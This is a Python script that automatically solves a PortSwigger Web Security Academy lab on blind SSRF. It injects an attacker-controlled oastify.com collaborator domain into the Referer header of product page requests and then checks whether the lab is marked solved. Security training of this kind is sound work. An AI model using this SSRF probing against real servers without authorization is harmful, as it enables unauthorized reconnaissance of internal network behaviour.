#!/usr/bin/env python3
"""
Blind SSRF with Out-of-Band Detection Lab - Fixed Version
PortSwigger Web Security Academy

Usage: python3 blind_ssrf_exploit.py https://your-lab-url.web-security-academy.net
"""

import requests
import urllib3
import sys
import time
import random
import string
import re
from urllib.parse import urlparse
from datetime import datetime

# Disable SSL warnings for lab environment
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI Colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.MAGENTA}
╔══════════════════════════════════════════════════════════╗
║     Blind SSRF with Out-of-Band Detection Exploit       ║
║                    FIXED VERSION                        ║
║              PortSwigger Web Security Academy           ║
╚══════════════════════════════════════════════════════════╝
{Colors.ENDC}"""
    print(banner)

def validate_url(url):
    """Validate and format the lab URL"""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def generate_oast_domain():
    """
    Generate a random OAST domain using public PortSwigger services
    """
    domains = [
        'oastify.com',
        'burpcollaborator.net'
    ]
    
    # Generate random subdomain (12-16 characters) - exactly like the working example
    subdomain_length = 32  # Length like wrrdxjrn9r4rbyjb8wnm2z3d54bvznnc
    subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=subdomain_length))
    
    # Use oastify.com as it's confirmed working
    base_domain = 'oastify.com'
    
    full_domain = f"{subdomain}.{base_domain}"
    return full_domain

def get_product_page(session, base_url):
    """Fetch a product page to establish session and get cookies"""
    for product_id in [1, 2, 3, 4, 5]:
        url = f"{base_url}/product?productId={product_id}"
        try:
            print(f"{Colors.YELLOW}[*] Trying product ID: {product_id}{Colors.ENDC}")
            response = session.get(url, verify=False, timeout=10)
            if response.status_code == 200:
                print(f"{Colors.GREEN}[+] Successfully fetched product page (ID: {product_id}){Colors.ENDC}")
                return True, product_id
        except Exception as e:
            print(f"{Colors.RED}[-] Error: {e}{Colors.ENDC}")
            continue
    
    return False, None

def send_ssrf_payload(session, base_url, oast_domain, product_id=1):
    """Send the SSRF payload by modifying the Referer header"""
    url = f"{base_url}/product?productId={product_id}"
    
    # Get current session cookies
    cookies = session.cookies.get_dict()
    
    # Create headers with modified Referer
    headers = {
        'Referer': f'https://{oast_domain}/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    
    try:
        print(f"{Colors.BLUE}[*] Sending request with Referer: https://{oast_domain}/{Colors.ENDC}")
        print(f"{Colors.CYAN}[i] Using session cookie: {cookies.get('session', 'None')}{Colors.ENDC}")
        
        response = session.get(url, headers=headers, verify=False, timeout=10)
        
        if response.status_code == 200:
            print(f"{Colors.GREEN}[+] Payload sent successfully!{Colors.ENDC}")
            return True
        else:
            print(f"{Colors.YELLOW}[-] Payload sent but got status: {response.status_code}{Colors.ENDC}")
            return False
    except Exception as e:
        print(f"{Colors.RED}[-] Error sending payload: {e}{Colors.ENDC}")
        return False

def verify_lab_solved(session, base_url):
    """
    Check if the lab is solved by looking for the success message
    """
    try:
        print(f"{Colors.YELLOW}[*] Checking if lab is solved...{Colors.ENDC}")
        response = session.get(base_url, verify=False, timeout=5)
        
        if "congratulations" in response.text.lower() or "solved" in response.text.lower():
            print(f"{Colors.GREEN}{Colors.BOLD}[+] Lab solved message detected!{Colors.ENDC}")
            return True
        
        # Also check for the lab solved banner
        if "you solved the lab!" in response.text.lower():
            print(f"{Colors.GREEN}{Colors.BOLD}[+] Lab solved message detected!{Colors.ENDC}")
            return True
            
    except Exception as e:
        print(f"{Colors.RED}[-] Error checking lab status: {e}{Colors.ENDC}")
    return False

def manual_check_instructions(oast_domain):
    """Provide instructions for manual checking"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}=== MANUAL CHECK REQUIRED ==={Colors.ENDC}")
    print(f"{Colors.CYAN}[i] The script has sent the payload with domain:{Colors.ENDC}")
    print(f"{Colors.GREEN}{Colors.BOLD}    {oast_domain}{Colors.ENDC}")
    print(f"\n{Colors.YELLOW}[*] To verify if the exploit worked:{Colors.ENDC}")
    print(f"{Colors.CYAN}    1. Open Burp Suite{Colors.ENDC}")
    print(f"{Colors.CYAN}    2. Go to the 'Collaborator' tab{Colors.ENDC}")
    print(f"{Colors.CYAN}    3. Click 'Poll now'{Colors.ENDC}")
    print(f"{Colors.CYAN}    4. Look for interactions with: {oast_domain}{Colors.ENDC}")
    print(f"\n{Colors.YELLOW}[*] Alternative: Use the public collaborator checker{Colors.ENDC}")
    print(f"{Colors.CYAN}    Visit: https://{oast_domain}{Colors.ENDC}")
    print(f"{Colors.CYAN}    (This may not show interactions, but worth a try){Colors.ENDC}")

def main():
    print_banner()
    
    # Check command line arguments
    if len(sys.argv) != 2:
        print(f"{Colors.YELLOW}Usage: python3 {sys.argv[0]} <LAB_URL>{Colors.ENDC}")
        print(f"Example: python3 {sys.argv[0]} https://0ade001104bb7b12834cdcf60005005e.web-security-academy.net")
        sys.exit(1)
    
    # Get lab URL from command line
    lab_url = validate_url(sys.argv[1])
    lab_id = re.search(r'https://([^.]+)', lab_url).group(1)
    print(f"{Colors.CYAN}[i] Target Lab: {lab_url}{Colors.ENDC}")
    print(f"{Colors.CYAN}[i] Lab ID: {lab_id}{Colors.ENDC}")
    
    # Generate OAST domain
    print(f"\n{Colors.BOLD}{Colors.BLUE}=== Generating OAST Domain ==={Colors.ENDC}")
    oast_domain = generate_oast_domain()
    print(f"{Colors.GREEN}[+] Generated OAST domain: {oast_domain}{Colors.ENDC}")
    print(f"{Colors.CYAN}[i] Using service: oastify.com{Colors.ENDC}")
    
    # Create session
    session = requests.Session()
    
    print(f"\n{Colors.BOLD}{Colors.BLUE}=== Step 1: Establishing Session ==={Colors.ENDC}")
    
    # Get product page and establish session
    success, product_id = get_product_page(session, lab_url)
    
    if not success:
        print(f"{Colors.RED}[-] Could not fetch any product page. Exiting.{Colors.ENDC}")
        sys.exit(1)
    
    print(f"\n{Colors.BOLD}{Colors.BLUE}=== Step 2: Sending SSRF Payload ==={Colors.ENDC}")
    
    # Send the payload
    if send_ssrf_payload(session, lab_url, oast_domain, product_id):
        print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Payload sent successfully!{Colors.ENDC}")
    else:
        print(f"\n{Colors.YELLOW}[-] Payload may not have been sent correctly.{Colors.ENDC}")
    
    print(f"\n{Colors.BOLD}{Colors.BLUE}=== Step 3: Waiting for interactions ==={Colors.ENDC}")
    print(f"{Colors.YELLOW}[*] Waiting 10 seconds for the server to process...{Colors.ENDC}")
    time.sleep(10)
    
    # Check if lab is solved by looking at the main page
    print(f"\n{Colors.BOLD}{Colors.BLUE}=== Step 4: Checking Lab Status ==={Colors.ENDC}")
    
    if verify_lab_solved(session, lab_url):
        print(f"\n{Colors.GREEN}{Colors.BOLD}🎉🎉🎉 LAB SOLVED! 🎉🎉🎉{Colors.ENDC}")
    else:
        print(f"\n{Colors.YELLOW}[-] Lab not automatically solved yet.{Colors.ENDC}")
        
        # Provide manual checking instructions
        manual_check_instructions(oast_domain)
        
        # Try one more time with a different product ID
        print(f"\n{Colors.YELLOW}[*] Attempting second payload with different product ID...{Colors.ENDC}")
        alt_product_id = 2 if product_id == 1 else 1
        
        # Generate new OAST domain for second attempt
        oast_domain2 = generate_oast_domain()
        print(f"{Colors.GREEN}[+] New OAST domain: {oast_domain2}{Colors.ENDC}")
        
        if send_ssrf_payload(session, lab_url, oast_domain2, alt_product_id):
            print(f"{Colors.GREEN}[+] Second payload sent!{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Wait 10 seconds and check Burp Collaborator for:{Colors.ENDC}")
            print(f"{Colors.CYAN}    {oast_domain}{Colors.ENDC}")
            print(f"{Colors.CYAN}    {oast_domain2}{Colors.ENDC}")
    
    print(f"\n{Colors.BOLD}{Colors.BLUE}=== Summary ==={Colors.ENDC}")
    print(f"{Colors.CYAN}Lab URL: {lab_url}{Colors.ENDC}")
    print(f"{Colors.CYAN}OAST Domain 1: {oast_domain}{Colors.ENDC}")
    if 'oast_domain2' in locals():
        print(f"{Colors.CYAN}OAST Domain 2: {oast_domain2}{Colors.ENDC}")
    print(f"{Colors.CYAN}Product ID used: {product_id}{Colors.ENDC}")
    print(f"\n{Colors.YELLOW}{Colors.BOLD}[!] Remember to check Burp Collaborator manually!{Colors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
        sys.exit(1)
